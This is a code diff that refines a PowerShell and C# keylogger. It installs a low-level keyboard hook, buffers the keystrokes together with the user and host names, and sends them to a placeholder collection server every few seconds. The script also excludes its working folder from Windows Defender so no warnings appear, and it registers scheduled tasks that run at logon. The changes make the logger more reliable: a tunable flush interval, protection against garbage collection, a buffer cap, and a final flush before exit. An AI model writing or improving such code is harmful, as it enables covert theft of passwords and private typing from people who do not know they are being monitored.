@@ -1,4 +1,5 @@
-$CollectionServer = "http://YOUR_SERVER_IP:8080/"
+$CollectionServer  = "http://YOUR_SERVER_IP:8080/"
+$FlushInterval     = 3000   # milliseconds — how often keystrokes are sent (1000 = 1s, 3000 = 3s)
 
 $LogonScript = @'
 $sessionId = [System.Diagnostics.Process]::GetCurrentProcess().SessionId
@@ -131,15 +132,16 @@ public class KeyboardMonitor {
     private static readonly StringBuilder buffer  = new StringBuilder();
     private static readonly object        bufLock = new object();
     private static string serverUrl, username, hostname;
+    private static Timer  flushTimer;   // static field so the GC can't collect it while Start() parks in the message loop
 
     public static void Start(string url, string user, string host) {
         serverUrl = url;
         username  = user;
         hostname  = host;
 
-        var timer = new Timer(3000) { AutoReset = true };
-        timer.Elapsed += (s, e) => Flush();
-        timer.Start();
+        flushTimer = new Timer(FLUSH_INTERVAL_MS) { AutoReset = true };
+        flushTimer.Elapsed += (s, e) => Flush();
+        flushTimer.Start();
 
         proc   = HookCallback;
         hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
@@ -149,12 +151,21 @@ public class KeyboardMonitor {
             TranslateMessage(ref msg);
             DispatchMessage(ref msg);
         }
+
+        // Message pump exited — flush anything remaining before process ends
+        Flush();
+        UnhookWindowsHookEx(hookId);
     }
 
     private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
         if (code >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN)) {
             var ks = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
-            lock (bufLock) { buffer.Append(TranslateKey((int)ks.vkCode, ks.scanCode)); }
+            bool overCap = false;
+            lock (bufLock) {
+                buffer.Append(TranslateKey((int)ks.vkCode, ks.scanCode));
+                if (buffer.Length > 5000) overCap = true;
+            }
+            if (overCap) System.Threading.ThreadPool.QueueUserWorkItem(_ => Flush());
         }
         return CallNextHookEx(hookId, code, wParam, lParam);
     }
@@ -226,9 +237,11 @@ New-Item -ItemType Directory -Path "C:\temp" -Force | Out-Null
 # Exclude C:\temp from Defender before writing scripts — silent, no tray warnings
 Add-MpPreference -ExclusionPath "C:\temp"
 
-$LogonScript.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer)     | Set-Content -Path "C:\temp\script.ps1"           -Encoding UTF8
-$WindowMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer)   | Set-Content -Path "C:\temp\window_monitor.ps1"   -Encoding UTF8
-$KeyboardMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer) | Set-Content -Path "C:\temp\keyboard_monitor.ps1"  -Encoding UTF8
+$LogonScript.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer) | Set-Content -Path "C:\temp\script.ps1" -Encoding UTF8
+
+$WindowMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer) | Set-Content -Path "C:\temp\window_monitor.ps1" -Encoding UTF8
+
+$KeyboardMonitor.Replace("http://YOUR_SERVER_IP:8080/", $CollectionServer).Replace("FLUSH_INTERVAL_MS", $FlushInterval) | Set-Content -Path "C:\temp\keyboard_monitor.ps1" -Encoding UTF8
 
 # Task 1: logon notification — runs as the logged-on user so env vars reflect the actual user
 Register-ScheduledTask `
